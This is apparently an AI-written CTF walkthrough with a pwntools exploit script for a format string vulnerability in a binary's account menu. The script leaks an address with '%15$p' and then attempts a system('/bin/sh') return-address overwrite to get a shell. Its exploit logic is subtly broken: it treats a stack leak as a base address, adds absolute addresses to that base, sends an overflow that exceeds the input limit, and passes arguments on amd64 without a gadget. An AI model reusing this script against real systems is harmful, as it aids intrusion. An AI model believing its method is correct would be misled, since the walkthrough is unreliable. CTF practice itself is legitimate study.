To solve this CTF challenge using `pwntools`, we need to identify the vulnerabilities and craft the appropriate exploit. Based on the provided code, the challenge appears to have a format string vulnerability in the `sub_400B07` function, which calls `printf` with a user-controlled format string.

Here are the steps to solve the challenge:

1. **Identify the Vulnerability**: The `sub_400B07` function uses `printf` with a user-controlled format string, which can lead to a format string vulnerability.

2. **Exploit the Vulnerability**: We can use the format string vulnerability to leak addresses or overwrite values in memory. For this challenge, we will use it to leak a stack address and then use that to calculate the base address of the binary or a library. Finally, we can overwrite the return address to gain control of the execution flow.

3. **Craft the Exploit**: We will use `pwntools` to automate the process of interacting with the binary and crafting the payload.

### Step-by-Step Solution

#### Step 1: Set Up the Environment
First, ensure you have `pwntools` installed. If not, you can install it using pip:
```sh
pip install pwntools
```

#### Step 2: Analyze the Binary
Use `gdb` or `pwntools` to analyze the binary and find the offsets and addresses needed for the exploit.

#### Step 3: Write the Exploit Script

Here is a Python script using `pwntools` to exploit the challenge:

```python
from pwn import *

# Set up the context (architecture, binary, and remote connection)
context.arch = 'amd64'
context.log_level = 'debug'

# Connect to the challenge (local or remote)
# For local testing
# p = process('./fmt')

# For remote connection
p = remote('challenge_server', 1337)

# Function to register an account
def register_account(username, password):
    p.recvuntil(b'1.Sh0w Account Infomation!')
    p.sendline(b'1')
    p.recvuntil(b'Input your username(max lenth:20): ')
    p.sendline(username)
    p.recvuntil(b'Input your password(max lenth:20): ')
    p.sendline(password)

# Function to edit account information
def edit_account(username, password):
    p.recvuntil(b'1.Sh0w Account Infomation!')
    p.sendline(b'2')
    p.recvuntil(b'please input new username(max lenth:20): ')
    p.sendline(username)
    p.recvuntil(b'please input new password(max lenth:20): ')
    p.sendline(password)

# Function to show account information
def show_account():
    p.recvuntil(b'1.Sh0w Account Infomation!')
    p.sendline(b'1')

# Function to quit
def quit():
    p.recvuntil(b'1.Sh0w Account Infomation!')
    p.sendline(b'3')

# Register an account with a controlled format string
register_account(b'A' * 20, b'B' * 20)

# Edit account to trigger the format string vulnerability
edit_account(b'%15$p', b'B' * 20)

# Show account information to leak the stack address
show_account()

# Receive the leaked address
p.recvuntil(b'B' * 20)
leaked_address = int(p.recvline().strip(), 16)
log.info(f'Leaked address: {hex(leaked_address)}')

# Calculate the base address of the binary or a library
# Assuming the leaked address is a stack address, we can use it to calculate the base address
# For example, if the leaked address is 0x7fffffffe000, and the offset to the base address is 0x1000
base_address = leaked_address - 0x1000
log.info(f'Base address: {hex(base_address)}')

# Find the address of the system function and "/bin/sh" string
# These addresses can be found using tools like `objdump` or `readelf`
system_address = base_address + 0x4008A6  # Replace with the actual offset
bin_sh_address = base_address + 0x4008BB  # Replace with the actual offset

# Craft the payload to overwrite the return address
payload = b'A' * 20
payload += p64(system_address)
payload += p64(0)  # Placeholder for the return address after system
payload += p64(bin_sh_address)

# Edit account with the crafted payload
edit_account(payload, b'B' * 20)

# Trigger the vulnerability
show_account()

# Interact with the shell
p.interactive()
```

### Explanation

1. **Register an Account**: We register an account with a controlled format string to leak a stack address.
2. **Edit Account**: We edit the account to trigger the format string vulnerability and leak the stack address.
3. **Show Account Information**: We show the account information to receive the leaked address.
4. **Calculate Base Address**: Using the leaked address, we calculate the base address of the binary or a library.
5. **Find System and "/bin/sh" Addresses**: We find the addresses of the `system` function and the `"/bin/sh"` string.
6. **Craft the Payload**: We craft the payload to overwrite the return address with the address of the `system` function and the address of `"/bin/sh"`.
7. **Trigger the Vulnerability**: We edit the account with the crafted payload and trigger the vulnerability to get a shell.

### Notes
- The offsets for `system` and `"/bin/sh"` need to be determined using tools like `objdump` or `readelf`.
- The base address calculation might need adjustment based on the actual binary and environment.

This script should help you exploit the format string vulnerability and gain a shell. Adjust the offsets and addresses as needed for your specific environment.
